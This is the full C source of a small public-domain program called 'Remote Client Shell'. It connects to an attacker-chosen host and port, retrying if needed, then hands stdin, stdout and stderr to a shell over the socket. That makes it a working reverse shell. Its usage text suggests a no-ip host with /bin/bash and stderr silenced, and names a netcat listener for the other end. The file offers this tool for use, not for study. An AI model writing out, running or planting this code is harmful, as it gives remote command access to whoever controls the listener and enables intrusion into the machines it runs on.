/* Andre Augusto Giannotti Scota (a2gs)
 * andre.scota@gmail.com
 *
 * Remote Client Shell
 *
 * Public Domain
 *
 */

/* rcs.c
 * Remote Client Shell: duplicate STDIN_FILENO, STDOUT_FILENO, and STDERR_FILENO to a process related to a socket.
 *
 *  Who     | When       | What
 *  --------+------------+----------------------------
 *   a2gs   | 26/01/2019 | Creation
 *          |            |
 */


/* *** INCLUDES ************************************************************************ */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>


int main(int argc, char *argv[])
{
	int sockfd = 0, retry = 0, i = 0;
	char * shellParam[] = {"", NULL};
	struct sockaddr_in servaddr = {0};
	struct hostent *servResolved = NULL;
	struct in_addr ip_addr = {0};

	if(argc != 6){
		fprintf(stderr, "Usage: %s <IP> <PORT> <SHELL> <N_RETRY_CONNECT> <RETRY_SECONDS>\n", argv[0]);
		fprintf(stderr, "\tSample: %s sample.noip.com 9988 '/bin/bash' 10 5 2>/dev/null\n\n", argv[0]);
		fprintf(stderr, "Remote (netcat) usage: nc -nvlp <PORT>\n");
		return(-1);
	}

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd < 0){
		fprintf(stderr, "ERRO: socket() [%s]\n", strerror(errno));
		return(-1);
	}

	shellParam[0] = argv[3];

	bzero(&servaddr, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port   = htons(atoi(argv[2]));
	retry = atoi(argv[4]);

	servResolved = gethostbyname(argv[1]);
	if(servResolved == NULL){
		fprintf(stderr, "ERRO: gethostbyname() ");

		switch(h_errno){
			case HOST_NOT_FOUND:
				fprintf(stderr, "[The specified host is unknown]\n");
				break;

			case NO_ADDRESS:
			/*case NO_DATA:*/
				fprintf(stderr, "[The requested name is valid but does not have an IP address]\n");
				break;

			case NO_RECOVERY:
				fprintf(stderr, "[A non-recoverable name server error occurred]\n");
				break;

			case TRY_AGAIN:
				fprintf(stderr, "[A temporary error occurred on an authoritative name server. Try again later]\n");
				break;

			default:
				fprintf(stderr, "[error unknow]\n");
				break;
		}
		return(-1);
	}

	ip_addr = *(struct in_addr *)(servResolved->h_addr);

	if(inet_pton(AF_INET, inet_ntoa(ip_addr), &servaddr.sin_addr) < 0){
		fprintf(stderr, "ERRO: inet_pton() [%s]\n", strerror(errno));
		return(-1);
	}

	for(i = 0; i < retry; i++){
		if(connect(sockfd, (const struct sockaddr *) &servaddr, sizeof(servaddr)) < 0){
			fprintf(stderr, "ERRO: connect() [%s]. Retry %d/%d after %s seconds.\n", strerror(errno), i+1, retry, argv[5]);
			sleep(atoi(argv[5]));
			continue;
		}
		break;
	}

	if(dup2(sockfd, 0) == -1){
		fprintf(stderr, "ERRO: dup2(sock, 0) [%s].\n", strerror(errno));
		return(-1);
	}

	if(dup2(sockfd, 1) == -1){
		fprintf(stderr, "ERRO: dup2(sock, 1) [%s].\n", strerror(errno));
		return(-1);
	}

	if(dup2(sockfd, 2) == -1){
		fprintf(stderr, "ERRO: dup2(sock, 2) [%s].\n", strerror(errno));
		return(-1);
	}

	execve(shellParam[0], shellParam, NULL);

	return(0);
}
